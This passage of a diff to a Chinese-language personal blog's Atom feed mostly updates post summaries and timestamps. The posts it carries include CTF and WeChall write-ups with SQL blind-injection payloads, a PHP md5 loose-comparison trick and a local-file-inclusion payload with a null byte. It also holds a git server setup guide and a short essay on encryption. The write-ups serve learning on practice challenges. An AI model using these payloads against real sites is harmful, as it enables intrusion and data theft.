class="number">0</span>)# </span><br><span class="line">构成以下语句:</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> <span class="keyword">if</span>(<span class="keyword">rpad</span>(username,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">"a"</span>,<span class="number">1</span>,<span class="number">0</span>)#<span class="string">"</span><br><span class="line">在知道该表有username字段后, 可以通过这语句进行盲注</span></span></span><br></pre></td></tr></table></figure>
@@ -643,7 +686,9 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload 0x2:</span><br><span class="line">    $i = 111" OR username REGEXP "^[a-z]</span><br><span class="line"><span class="operator"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID =<span class="string">"111"</span> <span class="keyword">OR</span> username <span class="keyword">REGEXP</span> <span class="string">"^[a-z]"</span></span><br><span class="line">正则匹配法注入, 真是涨姿势了, 第一次见</span><br><span class="line"></span><br><span class="line">payload <span class="number">0x3</span>:</span><br><span class="line">    $i = <span class="number">111</span><span class="string">" OR (ascii(ord(username,1,1)))=97# 或者 111"</span> <span class="keyword">OR</span> (<span class="keyword">ord</span>(username,<span class="number">1</span>,<span class="number">1</span>))=<span class="string">'a'</span>#</span><br><span class="line"><span class="keyword">select</span> pic <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> ID=<span class="string">"111"</span> <span class="keyword">OR</span> (<span class="keyword">ascii</span>(<span class="keyword">ord</span>(username,<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">97</span>#<span class="string">"</span><br><span class="line">这种方法我以前盲注的时候写过, 可是当没有select的时候, 我却自然的以为这些不行用了...</span></span></span><br></pre></td></tr></table></figure>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/sqli.jpg" alt="SQLI"><br>]]>
+    <![CDATA[<blockquote>
+<p>这次的XDCTF, 关于web1 400, 学到了很多666的姿势, 开一篇新博文, 记录这些姿势..</p>
+</blockquote>]]>
     
     </summary>
     
@@ -658,8 +703,10 @@
     <link href="http://0x48.pw/2015/10/03/0x08/"/>
     <id>http://0x48.pw/2015/10/03/0x08/</id>
     <published>2015-10-03T06:11:30.000Z</published>
-    <updated>2015-10-15T01:09:05.489Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/xdctf.png" alt="xdctf"><br><a id="more"></a><br>国庆两天, XDCTF, 质量和难度和上次的NSCTF都不是一个层次的…</p>
+    <updated>2016-03-28T10:23:11.950Z</updated>
+    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-xdctf.png" alt="xdctf"></p>
+<a id="more"></a>
+<p>国庆两天, XDCTF, 质量和难度和上次的NSCTF都不是一个层次的…</p>
 <h2 id="web1_100">web1 100</h2><p><code>index.php~</code> 搞出源码:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">'test'</span>];</span><br><span class="line"><span class="variable">$test</span>=md5(<span class="variable">$test</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>) &#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"flag&#123;xxxxxx&#125;"</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"you are falied!"</span>; </span><br><span class="line"><span class="keyword">print</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"tips:知道原理了，请不在当先服务器环境下测试，在本地测试好，在此测试poc即可，否则后果自负"</span>; </span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
 <p>这题黑魔法啊!!! 真是学习了<br><code>md5(&#39;240610708&#39;) = 0e462097431906509019562988736854</code><br>而 <code>&#39;0e462097431906509019562988736854&#39; == &#39;0&#39;</code></p>
 <h2 id="web1_200">web1 200</h2><p>这题是大JAVA的题目,  可惜并不会,, 就是有个一个SessionExample界面, 可以进行设置session, (为啥需要这种东西?)<br>然后设置, login=true, user=Administrator</p>
@@ -673,7 +720,7 @@
 <p>后面就日不动了,,, 毕竟P神…<br>XDCTF的web题质量都挺高的…学到了很多..</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/xdctf.png" alt="xdctf"><br>]]>
+    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-xdctf.png" alt="xdctf"></p>]]>
     
     </summary>
     
@@ -688,9 +735,11 @@
     <link href="http://0x48.pw/2015/08/07/0x06/"/>
     <id>http://0x48.pw/2015/08/07/0x06/</id>
     <published>2015-08-07T09:01:53.000Z</published>
-    <updated>2015-10-15T01:08:56.793Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/wechall.gif" alt="Wechall"><br><a id="more"></a></p>
-<p>年轻人, 要多撸题, 少打炮..</p>
+    <updated>2016-03-28T10:23:57.478Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>年轻人，要多撸题，多看书，少打游戏，少打炮..</p>
+</blockquote>
+<a id="more"></a>
 <h2 id="0x00_No_Escape">0x00 No Escape</h2><p>看源码, 是sql注入.<br>payload: <code>index.php?vote_for=bill</code>=111%23`</p>
 <h2 id="0x01_Training:_PHP_LFI">0x01 Training: PHP LFI</h2><p>看源码, 文件包含漏洞.<br>payload: <code>index.php?file=../../solution.php%00</code></p>
 <h2 id="0x02_PHP_0817">0x02 PHP 0817</h2><p>这个比较傻..不多说.<br>payload: <code>index.php?which=solution</code></p>
@@ -707,7 +756,9 @@
 <!--## 0x08 Stop us-->
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/wechall.gif" alt="Wechall"><br>]]>
+    <![CDATA[<blockquote>
+<p>年轻人，要多撸题，多看书，少打游戏，少打炮..</p>
+</blockquote>]]>
     
     </summary>
     
@@ -722,9 +773,11 @@
     <link href="http://0x48.pw/2015/07/22/0x04/"/>
     <id>http://0x48.pw/2015/07/22/0x04/</id>
     <published>2015-07-22T12:30:25.000Z</published>
-    <updated>2015-10-15T01:08:20.667Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/git.jpg" alt="GIT"><br><a id="more"></a></p>
+    <updated>2016-03-28T10:24:27.846Z</updated>
+    <content type="html"><![CDATA[<blockquote>
 <p>今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。</p>
+</blockquote>
+<a id="more"></a>
 <p>git不像svn一样分服务端客户端，git在linux只需要一句命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git</span><br></pre></td></tr></table></figure></p>
 <p>之后，既可以做服务端，可以做客户端。</p>
 <h1 id="服务端">服务端</h1><p>如果想使用git做服务端，第一步就是创建git用户</p>
@@ -758,7 +811,9 @@
 <p><code>authorized_keys</code>文件的权限必须是644<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br><span class="line">$ ls -al</span><br><span class="line">-rw-r--r--. <span class="number">1</span> root root  authorized_keys</span><br></pre></td></tr></table></figure></p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/git.jpg" alt="GIT"><br>]]>
+    <![CDATA[<blockquote>
+<p>今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。</p>
+</blockquote>]]>
     
     </summary>
     
@@ -773,8 +828,11 @@
     <link href="http://0x48.pw/2015/07/19/0x02/"/>
     <id>http://0x48.pw/2015/07/19/0x02/</id>
     <published>2015-07-19T14:38:44.000Z</published>
-    <updated>2015-07-19T16:11:10.076Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/brain.jpg" alt="brain"><br><a id="more"></a></p>
+    <updated>2016-03-28T10:25:23.022Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>瞎J*乱想</p>
+</blockquote>
+<a id="more"></a>
 <p>加密最初的目的就是让数据更安全，可是经过这次事件，我认为，加密本身就是一件不安全的事情</p>
 <hr>
 <p>加密的功能不是让别人无法读取我的信息，而是让不知道密码的人读取到信息，系统并不能检测你是否是本人，只能知道你输入的密码是否正确。</p>
@@ -792,7 +850,9 @@
 <p>PS: 以上只是无聊时的突发奇想而已。。</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/brain.jpg" alt="brain"><br>]]>
+    <![CDATA[<blockquote>
+<p>瞎J*乱想</p>
+</blockquote>]]>
     
     </summary>
     
@@ -807,8 +867,11 @@
     <link href="http://0x48.pw/2015/07/19/0x01/"/>
     <id>http://0x48.pw/2015/07/19/0x01/</id>
     <published>2015-07-18T17:17:46.000Z</published>
-    <updated>2015-07-19T14:45:11.829Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/jian.jpg" alt="图片"><br><a id="more"></a></p>
+    <updated>2016-03-28T10:25:50.438Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>蛋疼</p>
+</blockquote>
+<a id="more"></a>
 <h2 id="起因">起因</h2><p>  强行拔移动硬盘。导致分区损坏。无法挂载。</p>
 <hr>
 <h2 id="Then">Then</h2><p>  就花了几天时间研究怎么修复，因为我很多重要的东西都放在移动硬盘上，就比如这个博客，还有我写的py脚本。。还有很多视频，文档之类的。<br>期间研究了有win上的分区修复软件。也有linux上的。因为硬盘有1TB。比较大，一次扫描就花了我很长时间</p>
@@ -827,7 +890,9 @@
 </blockquote>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/jian.jpg" alt="图片"><br>]]>
+    <![CDATA[<blockquote>
+<p>蛋疼</p>
+</blockquote>]]>
     
     </summary>
     
@@ -842,12 +907,15 @@
     <link href="http://0x48.pw/2015/07/19/0x00/"/>
     <id>http://0x48.pw/2015/07/19/0x00/</id>
     <published>2015-07-18T17:17:45.000Z</published>
-    <updated>2015-07-19T14:45:06.461Z</updated>
-    <content type="html"><![CDATA[<p><img src="/img/jump.png" alt="jump"><br><a id="more"></a></p>
+    <updated>2016-03-28T10:28:59.530Z</updated>
+    <content type="html"><![CDATA[<blockquote>
+<p>$\Uparrow$ 点击跳转<br><a id="more"></a></p>
 <script>window.location.href="http://old.lazysheep.cc"</script>
+</blockquote>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p><img src="/img/jump.png" alt="jump"><br>]]>
+    <![CDATA[<blockquote>
+<p>$\Uparrow$ 点击跳转<br>]]>
     
     </summary>
     
